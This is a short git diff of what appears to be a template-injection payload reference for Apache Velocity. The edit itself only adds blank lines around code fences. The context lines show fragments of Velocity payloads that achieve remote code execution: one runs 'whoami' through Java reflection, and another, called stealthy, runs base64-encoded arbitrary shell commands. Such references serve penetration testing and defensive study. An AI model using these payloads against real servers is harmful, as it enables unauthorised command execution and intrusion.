@@ -214,6 +214,7 @@ New version of Pebble :
 > Apache Velocity is a Java-based template engine that allows web designers to embed Java code references directly within templates.
 
 In a vulnerable environment, Velocity's expression language can be abused to achieve remote code execution (RCE). For example, this payload executes the whoami command and prints the result:
+
 ```java
 #set($str=$class.inspect("java.lang.String").type)
 #set($chr=$class.inspect("java.lang.Character").type)
@@ -226,6 +227,7 @@ $str.valueOf($chr.toChars($out.read()))
 ```
 
 A more flexible and stealthy payload that supports base64-encoded commands, allowing execution of arbitrary shell commands such as `echo "a" > /tmp/a`. Below is an example with `whoami` in base64:
+
 ```java
 #set($base64EncodedCommand = 'd2hvYW1p')
 
@@ -256,6 +258,7 @@ A more flexible and stealthy payload that supports base64-encoded commands, allo
   $output.replaceAll("\\s+$", "").replaceAll("^\\s+", "")
 #end
 ```
+
 ---
 
 ## Groovy
